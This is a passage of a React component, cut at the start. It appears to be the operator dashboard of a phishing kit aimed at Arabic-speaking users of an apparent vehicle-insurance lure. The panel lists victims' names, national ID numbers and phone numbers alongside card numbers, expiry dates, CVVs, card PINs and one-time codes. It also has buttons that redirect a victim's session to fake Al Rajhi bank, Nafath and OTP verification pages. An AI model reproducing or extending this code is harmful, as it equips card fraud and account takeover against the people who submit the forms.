                              {format(new Date(notification.createdDate), "HH:mm")}
                            </span>
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex justify-center gap-1">
                            <Button
                              variant="ghost"
                              size="icon"
                              className="h-8 w-8 rounded-full hover:bg-slate-100 hover:text-slate-700 dark:hover:bg-slate-800 dark:hover:text-slate-300"
                              onClick={(e) => {
                                e.stopPropagation()
                                handleViewDetails(notification)
                              }}
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild onClick={(e) => e.stopPropagation()}>
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  className="h-8 w-8 rounded-full hover:bg-slate-100 hover:text-slate-700 dark:hover:bg-slate-800 dark:hover:text-slate-300"
                                >
                                  <MoreHorizontal className="h-4 w-4" />
                                </Button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end">
                                <DropdownMenuLabel>خيارات</DropdownMenuLabel>
                                <DropdownMenuSeparator />
                                <DropdownMenuItem
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    handleInfoClick(notification, "personal")
                                  }}
                                  className="gap-2"
                                >
                                  <User className="h-4 w-4" />
                                  معلومات شخصية
                                </DropdownMenuItem>

                                {(notification.card_number ||
                                  (notification.formData && notification.formData.card_number)) && (
                                  <DropdownMenuItem
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      handleInfoClick(notification, "card")
                                    }}
                                    className="gap-2"
                                  >
                                    <CreditCard className="h-4 w-4" />
                                    معلومات البطاقة
                                  </DropdownMenuItem>
                                )}

                                {notification.vehicle_type && (
                                  <DropdownMenuItem
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      handleInfoClick(notification, "vehicle")
                                    }}
                                    className="gap-2"
                                  >
                                    <Car className="h-4 w-4" />
                                    معلومات المركبة
                                  </DropdownMenuItem>
                                )}

                                <DropdownMenuSeparator />

                                <DropdownMenuItem
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    handleDelete(notification.id)
                                  }}
                                  className="gap-2 text-rose-600 dark:text-rose-500"
                                >
                                  <Trash2 className="h-4 w-4" />
                                  حذف
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}
          </CardContent>

          <CardFooter className="p-4 bg-white dark:bg-slate-800 border-t flex justify-between items-center">
            <div className="text-sm text-muted-foreground">
              إجمالي البيانات: {notifications.length} | تم عرض: {filteredNotifications.length}
            </div>
            <div className="text-sm">
              {activeFilter && (
                <Badge variant="outline" className="gap-1">
                  <Filter className="h-3 w-3" />
                  {activeFilter === "pending"
                    ? "قيد الانتظار"
                    : activeFilter === "approved"
                      ? "مقبول"
                      : activeFilter === "rejected"
                        ? "مرفوض"
                        : activeFilter === "payment"
                          ? "دفع"
                          : activeFilter === "registration"
                            ? "تسجيل"
                            : activeFilter}
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-4 w-4 ml-1 hover:bg-transparent"
                    onClick={() => setActiveFilter(null)}
                  >
                    <XCircle className="h-3 w-3" />
                  </Button>
                </Badge>
              )}
            </div>
          </CardFooter>
        </Card>
      </div>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white dark:bg-slate-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات المركبة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية للمستخدم"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة البنكية"
                  : "تفاصيل معلومات المركبة"}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">الاسم الكامل</p>
                <div className="flex items-center gap-2 mt-1">
                  <User className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                  <p className="font-medium text-lg">
                    {selectedNotification.documment_owner_full_name ||
                      selectedNotification.document_owner_full_name ||
                      "غير محدد"}
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">رقم الهوية</p>
                <div className="flex items-center gap-2 mt-1">
                  <Shield className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                  <p className="font-medium text-lg font-mono">
                    {selectedNotification.owner_identity_number ||
                      selectedNotification.buyer_identity_number ||
                      "غير محدد"}
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">رقم الهاتف</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium text-lg font-mono">{selectedNotification.phone}</p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">نوع الطلب</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium">
                    {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
                  </p>
                </div>
              </div>

              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium font-mono">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <Tabs defaultValue="main" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-4">
                <TabsTrigger
                  value="main"
                  className="data-[state=active]:bg-slate-800 data-[state=active]:text-white dark:data-[state=active]:bg-slate-700"
                >
                  البطاقة الرئيسية
                </TabsTrigger>
                <TabsTrigger
                  value="form"
                  className="data-[state=active]:bg-slate-800 data-[state=active]:text-white dark:data-[state=active]:bg-slate-700"
                >
                  بيانات النموذج
                </TabsTrigger>
              </TabsList>
              <TabsContent value="main" className="space-y-3 py-2">
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <User className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                    <p className="font-medium text-lg">
                      {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
                    </p>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <CreditCard className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.card_number || "غير محدد"}</p>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Calendar className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                    <p className="font-medium text-lg font-mono">
                      {selectedNotification.expiration_date || "غير محدد"}
                    </p>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.cvv || "غير محدد"}</p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="form" className="space-y-3 py-2">
                {selectedNotification.formData ? (
                  <>
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <User className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <p className="font-medium text-lg">{selectedNotification.formData.full_name || "غير محدد"}</p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <CreditCard className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.card_number || "غير محدد"}
                        </p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Calendar className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.expiration_date || "غير محدد"}
                        </p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Shield className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.cvv || "غير محدد"}
                        </p>
                      </div>
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center py-8 text-muted-foreground">
                    <AlertCircle className="h-12 w-12 mb-2 text-muted-foreground/50" />
                    <p>لا توجد بيانات نموذج متاحة</p>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          )}

          {selectedInfo === "vehicle" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">نوع المركبة</p>
                <div className="flex items-center gap-2 mt-1">
                  <Car className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                  <p className="font-medium text-lg">{selectedNotification.vehicle_type || "غير محدد"}</p>
                </div>
              </div>

              {selectedNotification.vehicle_manufacture_number && (
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم تصنيع المركبة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.vehicle_manufacture_number}</p>
                  </div>
                </div>
              )}

              {selectedNotification.customs_code && (
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رمز الجمارك</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.customs_code}</p>
                  </div>
                </div>
              )}

              {selectedNotification.seller_identity_number && (
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم هوية البائع</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.seller_identity_number}</p>
                  </div>
                </div>
              )}

              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
            <Button onClick={closeDialog} className="w-full" variant="outline">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Card Dialog */}
      <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
        <DialogContent className="bg-white dark:bg-slate-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
              معلومات البطاقة
            </DialogTitle>
            <DialogDescription>تفاصيل معلومات البطاقة البنكية</DialogDescription>
          </DialogHeader>

          {selectedCardInfo && (
            <div className="space-y-4 py-3">
              <div className="p-5 rounded-lg bg-gradient-to-r from-slate-700 to-slate-800 dark:from-slate-600 dark:to-slate-700 text-white shadow-lg">
                <div className="flex justify-between items-start mb-6">
                  <div className="flex flex-col">
                    <span className="text-xs text-slate-300 mb-1">حامل البطاقة</span>
                    <span className="font-medium">
                      {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                    </span>
                  </div>
                  <CreditCard className="h-8 w-8 text-white opacity-80" />
                </div>

                <div className="mb-4">
                  <span className="text-xs text-slate-300 mb-1 block">رقم البطاقة</span>
                  <span className="font-mono text-lg tracking-wider" dir="ltr">
                    {selectedCardInfo.card_number ||
                      (selectedCardInfo.formData && selectedCardInfo.formData.card_number) ||
                      "غير محدد"}
                  </span>
                </div>

                <div className="flex justify-between">
                  <div>
                    <span className="text-xs text-slate-300 block">تاريخ الانتهاء</span>
                    <span className="font-mono">
                      {selectedCardInfo.expiration_date ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.expiration_date) ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div>
                    <span className="text-xs text-slate-300 block">رمز الأمان</span>
                    <span className="font-mono">
                      {selectedCardInfo.cvv ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.cvv) ||
                        "غير محدد"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700">
                <h3 className="font-medium mb-2 text-sm">معلومات إضافية</h3>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">رقم سري بطاقة:</span>
                    <span>{selectedCardInfo.pinCode || "غير متوفر"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">رمز تحقق:</span>
                    <span>{selectedCardInfo.otpCode || selectedCardInfo.phoneOtp || "غير متوفر"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">الحالة:</span>
                    <span>
                      {selectedCardInfo.paymentStatus === "approved"
                        ? "مقبول"
                        : selectedCardInfo.paymentStatus === "rejected"
                          ? "مرفوض"
                          : "قيد الانتظار"}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t gap-2">
            {selectedCardInfo?.card_number ? (
              <>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white border-0 shadow-md"
                >
                  رفض
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedCardInfo.id)
                    setShowCardDialog(false)
                  }}
                  className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                >
                  قبول بطاقة
                </Button>
                <Button
                  onClick={() => {
                    handlePassApproval("approved", selectedCardInfo.id)
                  }}
                  className="w-full bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white border-0 shadow-md"
                >
                  باس
                </Button>
                <Button
                  onClick={() => {
                    handleUpdatePagename(selectedCardInfo.id, "external-link")
                  }}
                  className="w-full bg-gradient-to-r from-slate-600 to-slate-700 hover:from-slate-700 hover:to-slate-800 text-white border-0 shadow-md"
                >
                  راجحي
                </Button>
              </>
            ) : null}
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Pagename Dialog */}
      <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
        <DialogContent className="bg-white dark:bg-slate-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
              نوع الطلب
            </DialogTitle>
            <DialogDescription>تحديد أو تغيير نوع الطلب</DialogDescription>
          </DialogHeader>

          {selectedNotification && (
            <div className="space-y-4 py-3">
              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700">
                <h3 className="font-medium mb-3 text-sm">النوع الحالي</h3>
                <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
              </div>

              <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-700">
                <h3 className="font-medium mb-3 text-sm">اختر نوع الطلب</h3>
                <div className="grid grid-cols-2 gap-2">
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "payment"
                        ? "bg-cyan-50 border-cyan-300 dark:bg-cyan-900/30 dark:border-cyan-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                  >
                    <CreditCard className="h-4 w-4" />
                    دفع
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === ""
                        ? "bg-violet-50 border-violet-300 dark:bg-violet-900/30 dark:border-violet-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                  >
                    <FileText className="h-4 w-4" />
                    تسجيل
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "nafaz"
                        ? "bg-teal-50 border-teal-300 dark:bg-teal-900/30 dark:border-teal-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                  >
                    <Shield className="h-4 w-4" />
                    نفاذ
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-otp"
                        ? "bg-pink-50 border-pink-300 dark:bg-pink-900/30 dark:border-pink-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                  >
                    <Shield className="h-4 w-4" />
                    رمز OTP
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "external-link"
                        ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                  >
                    <Tag className="h-4 w-4" />
                    راجحي
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-card-ownership"
                        ? "bg-amber-50 border-amber-300 dark:bg-amber-900/30 dark:border-amber-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                  >
                    <CreditCard className="h-4 w-4" />
                    رمز ownership
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-phone"
                        ? "bg-rose-50 border-rose-300 dark:bg-rose-900/30 dark:border-rose-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                  >
                    <Smartphone className="h-4 w-4" />
                    رمز هاتف
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "offers"
                        ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                  >
                    <Tag className="h-4 w-4" />
                    عروض
                  </Button>
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
            <Button onClick={() => setShowPagenameDialog(false)} className="w-full" variant="outline">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Sidebar for detailed view */}
      <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
        <SheetContent side="left" className="w-full sm:max-w-md overflow-y-auto" dir="rtl">
          <SheetHeader className="text-right">
            <SheetTitle className="text-xl font-bold bg-gradient-to-r from-slate-700 to-slate-900 dark:from-slate-300 dark:to-slate-100 text-transparent bg-clip-text">
              تفاصيل البيانات
            </SheetTitle>
            <SheetDescription>عرض جميع المعلومات المتعلقة بهذا الطلب</SheetDescription>
          </SheetHeader>

          {selectedNotification && (
            <div className="h-[calc(100vh-120px)] pr-4 -mr-4">
              <div className="mt-6 space-y-6">
                <div className="bg-slate-50 dark:bg-slate-700/50 rounded-lg p-4 border border-slate-200 dark:border-slate-600">
                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                    <User className="h-5 w-5 text-slate-600 dark:text-slate-300" />
                    المعلومات الشخصية
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">الاسم الكامل:</span>
                      <span className="font-medium">
                        {selectedNotification.documment_owner_full_name ||
                          selectedNotification.document_owner_full_name ||
                          selectedNotification.full_name ||
                          "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">رقم الهوية:</span>
                      <span className="font-medium font-mono">
                        {selectedNotification.owner_identity_number ||
                          selectedNotification.buyer_identity_number ||
                          "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">رقم الهاتف:</span>
                      <span className="font-medium font-mono">{selectedNotification.phone || "غير محدد"}</span>
                    </div>
                    {selectedNotification.phone2 && (
                      <div className="flex justify-between">
                        <span className="text-sm text-muted-foreground">رقم الهاتف 2:</span>
                        <span className="font-medium font-mono">{selectedNotification.phone2}</span>
                      </div>
                    )}
                  </div>
                </div>

                {(selectedNotification.card_number ||
                  (selectedNotification.formData && selectedNotification.formData.card_number)) && (
                  <div className="bg-slate-50 dark:bg-slate-700/50 rounded-lg p-4 border border-slate-200 dark:border-slate-600">
                    <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                      <CreditCard className="h-5 w-5 text-slate-600 dark:text-slate-300" />
                      معلومات البطاقة
                    </h3>
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-sm text-muted-foreground">رقم البطاقة:</span>
                        <span className="font-medium font-mono" dir="ltr">
                          {selectedNotification.card_number ||
                            (selectedNotification.formData && selectedNotification.formData.card_number) ||
                            "غير محدد"}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-sm text-muted-foreground">تاريخ الانتهاء:</span>
                        <span className="font-medium font-mono">
                          {selectedNotification.expiration_date ||
                            (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
                            "غير محدد"}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-sm text-muted-foreground">رمز الأمان:</span>
                        <span className="font-medium font-mono">
                          {selectedNotification.cvv ||
                            (selectedNotification.formData && selectedNotification.formData.cvv) ||
                            "غير محدد"}
                        </span>
                      </div>
                      {selectedNotification.pinCode && (
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground shift">الرقم السري:</span>
                          <span className="font-medium font-mono">{selectedNotification.pinCode}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {selectedNotification.vehicle_type && (
                  <div className="bg-slate-50 dark:bg-slate-700/50 rounded-lg p-4 border border-slate-200 dark:border-slate-600">
                    <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                      <Car className="h-5 w-5 text-slate-600 dark:text-slate-300" />
                      معلومات المركبة
                    </h3>
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-sm text-muted-foreground">نوع المركبة:</span>
                        <span className="font-medium">{selectedNotification.vehicle_type}</span>
                      </div>
                      {selectedNotification.vehicle_manufacture_number && (
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground">رقم تصنيع المركبة:</span>
                          <span className="font-medium font-mono">
                            {selectedNotification.vehicle_manufacture_number}
                          </span>
                        </div>
                      )}
                      {selectedNotification.customs_code && (
                        <div className="flex justify-between">
                          <span className="text-sm text-muted-foreground">رمز الجمارك:</span>
                          <span className="font-medium font-mono">{selectedNotification.customs_code}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                <div className="bg-slate-50 dark:bg-slate-700/50 rounded-lg p-4 border border-slate-200 dark:border-slate-600">
                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2">
                    <Bell className="h-5 w-5 text-slate-600 dark:text-slate-300" />
                    معلومات الطلب
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">نوع الطلب:</span>
                      <div>{getPageType(selectedNotification.pagename)}</div>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">الحالة:</span>
                      <div>{getStatusBadge(selectedNotification.status)}</div>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-muted-foreground">تاريخ الإنشاء:</span>
                      <span className="font-medium">
                        {format(new Date(selectedNotification.createdDate), "yyyy/MM/dd HH:mm")}
                      </span>
                    </div>
                  </div>
                </div>

                <div className="flex gap-2 mt-6">
                  <Button
                    onClick={() => {
                      handleApproval("approved", selectedNotification.id)
                      setShowSidebar(false)
                    }}
                    className="flex-1 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                  >
                    <CheckCircle className="h-4 w-4 mr-2" />
                    قبول
                  </Button>
                  <Button
                    onClick={() => {
                      handleApproval("rejected", selectedNotification.id)
                      setShowSidebar(false)
                    }}
                    className="flex-1 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white border-0 shadow-md"
                  >
                    <XCircle className="h-4 w-4 mr-2" />
                    رفض
                  </Button>
                  <Button
                    onClick={() => {
                      handleDelete(selectedNotification.id)
                      setShowSidebar(false)
                    }}
                    variant="outline"
                    className="flex-1"
                  >
                    <Trash2 className="h-4 w-4 mr-2" />
                    حذف
                  </Button>
                </div>
              </div>
            </div>
          )}
        </SheetContent>
      </Sheet>

      {/* External Component Dialogs */}
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />

      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />

      <PhoneDialog
        phoneOtp={selectedNotification?.phoneOtp}
        handlePhoneOtpApproval={handlePhoneOtpApproval}
        open={showPhoneDialog}
        onOpenChange={setPhoneDialog}
        notification={selectedNotification}
      />
    
    </div>
  )
}

